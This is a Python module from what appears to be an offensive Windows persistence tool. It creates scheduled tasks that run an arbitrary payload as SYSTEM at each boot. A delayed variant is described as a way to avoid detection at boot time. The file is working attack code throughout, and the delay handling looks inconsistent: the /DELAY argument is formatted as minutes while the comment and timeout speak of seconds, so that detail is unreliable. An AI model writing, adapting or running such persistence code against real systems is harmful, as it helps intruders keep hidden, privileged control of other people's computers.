"""
Boot-triggered scheduled task persistence
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import run_command, validate_payload_path, check_admin


class BootTrigger:
    """Handles boot-triggered scheduled tasks"""
    
    def __init__(self):
        self.is_admin = check_admin()
    
    def create(self, task_name, payload_path):
        """
        Create task that runs at system startup
        Requires administrator privileges
        
        Args:
            task_name (str): Task name
            payload_path (str): Payload path
            
        Returns:
            dict: Installation result
        """
        print(f"[*] Creating boot-triggered scheduled task...")
        
        if not self.is_admin:
            print("[!] This method requires administrator privileges")
            print("    Run the script as Administrator to use this trigger")
            return None
        
        is_valid, error = validate_payload_path(payload_path)
        if not is_valid:
            print(f"[-] Invalid payload: {error}")
            return None
        
        # Create task that runs as SYSTEM at boot
        command = (
            f'schtasks /Create /SC ONSTART /TN "{task_name}" '
            f'/TR "{payload_path}" /RU SYSTEM /F'
        )
        
        result = run_command(command, require_admin=True)
        
        if result['success']:
            print(f"[+] Scheduled task created successfully!")
            print(f"    Task Name: {task_name}")
            print(f"    Trigger: System startup")
            print(f"    Runs as: SYSTEM")
            print(f"    Payload: {payload_path}")
            print(f"    Admin Required: Yes")
            
            return {
                'method': 'boot_trigger',
                'task_name': task_name,
                'trigger': 'boot',
                'run_as': 'SYSTEM',
                'payload': payload_path,
                'requires_admin': True,
                'remove_command': f'schtasks /Delete /TN "{task_name}" /F'
            }
        else:
            print(f"[-] Failed to create task")
            if result.get('stderr'):
                print(f"    Error: {result['stderr']}")
            return None
    
    def create_delayed(self, task_name, payload_path, delay_seconds=30):
        """
        Create boot task with delay
        Useful to avoid detection at boot time
        
        Args:
            task_name (str): Task name
            payload_path (str): Payload path
            delay_seconds (int): Delay after boot
            
        Returns:
            dict: Installation result
        """
        print(f"[*] Creating delayed boot task...")
        print(f"[*] Delay: {delay_seconds} seconds after boot")
        
        if not self.is_admin:
            print("[!] Requires administrator privileges")
            return None
        
        is_valid, error = validate_payload_path(payload_path)
        if not is_valid:
            print(f"[-] Invalid payload: {error}")
            return None
        
        # Create delayed command
        delayed_command = f'cmd.exe /c timeout /t {delay_seconds} /nobreak && "{payload_path}"'
        
        command = (
            f'schtasks /Create /SC ONSTART /TN "{task_name}" '
            f'/TR "{delayed_command}" /RU SYSTEM /F /DELAY {delay_seconds:04d}:00'
        )
        
        result = run_command(command, require_admin=True)
        
        if result['success']:
            print(f"[+] Delayed boot task created!")
            print(f"    Delay: {delay_seconds} seconds")
            
            return {
                'method': 'boot_trigger_delayed',
                'task_name': task_name,
                'trigger': f'boot_delayed_{delay_seconds}s',
                'delay': delay_seconds,
                'payload': payload_path,
                'requires_admin': True,
                'remove_command': f'schtasks /Delete /TN "{task_name}" /F'
            }
        else:
            print(f"[-] Failed to create task")
            return None